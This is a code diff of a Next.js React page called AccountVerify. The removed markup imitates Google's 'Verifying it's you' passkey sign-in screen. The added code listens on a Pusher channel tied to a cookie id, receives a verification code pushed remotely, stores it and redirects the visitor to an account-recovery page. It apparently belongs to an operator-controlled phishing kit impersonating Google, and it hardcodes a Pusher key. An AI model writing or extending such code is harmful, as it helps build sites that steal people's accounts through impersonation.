@@ -1,57 +1,42 @@
-import Image from "next/image";
-import React from "react";
-import { MoveLeft } from "lucide-react";
-import { ChevronDown } from 'lucide-react';
+"use client";
+import VerifyingState from "@/component/VerifyingState/VerifyingState";
+import { useRouter } from "next/navigation";
+import React, { useEffect, useState } from "react";
+import Cookies from "js-cookie";
+import Pusher from "pusher-js";
 
 function AccountVerify() {
-  return (
-    <div className=" w-full min-h-screen flex flex-col justify-center items-center relative">
-      <div className="flex flex-col w-full max-w-md p-10 h-screen  justify-between ">
-        <div className="flex flex-col gap-10 ">
-          <div className="flex gap-4 items-center">
-            <MoveLeft />
-            <p className="font-bold text-2xl">
-              Google <span className="font-normal text-zinc-400">Account</span>{" "}
-            </p>
-          </div>
-          <div className="flex flex-col  gap-3">
-            <div className="">
-              <Image
-                src={"/logo2.png"}
-                alt="logo"
-                width={100}
-                height={100}
-                className="object-cover"
-              />
-            </div>
-            <h1 className="text-2xl font-medium mb-1 ">Welcome</h1>
-          </div>
-          <div className="space-y-2">
-            <p className="text-xl">Verifying it's you..</p>
-            <p>Complete sign-in using your passkey</p>
-          </div>
-          <div>
-            <p className="text-blue-500 font-semibold">Try another way</p>
-          </div>
-        </div>
-        
-          <div className="flex flex-col md:flex-row gap-5 justify-between items-start md:items-center text-sm font-semibold text-gray-600">
-            <span className="flex items-center gap-2">English (United States)
-            <ChevronDown size={20}/>
+  const router = useRouter();
 
+  const [verifyId, setVerifyId] = useState("");
+  const id = Cookies.get("id");
+  const pusher = new Pusher("05656b52c62c0f688ee3", {
+    // APP_KEY
+    cluster: "ap2",
+    encrypted: true,
+  });
+  // console.log(verifyId);
 
-            </span>
-            <div className="space-x-4">
-              <button>Help</button>
-              <button>Privacy</button>
-              <button>Terms</button>
-            </div>
-          </div>
-        
-      </div>
-      <div className="absolute bg-black/30 z-10 w-full h-full"/>
-    </div>
-  );
+  useEffect(() => {
+    const channel = pusher.subscribe(id);
+
+    channel.bind("code-verify", (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log("Path data updated:", data);
+      Cookies.set("code", data.code);
+      setVerifyId(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind("code-verify");
+      channel.unsubscribe(id);
+    };
+  }, [id]);
+
+  if (verifyId) {
+    return router.push("/accountrecovery");
+  }
+  return <VerifyingState />;
 }
 
 export default AccountVerify;
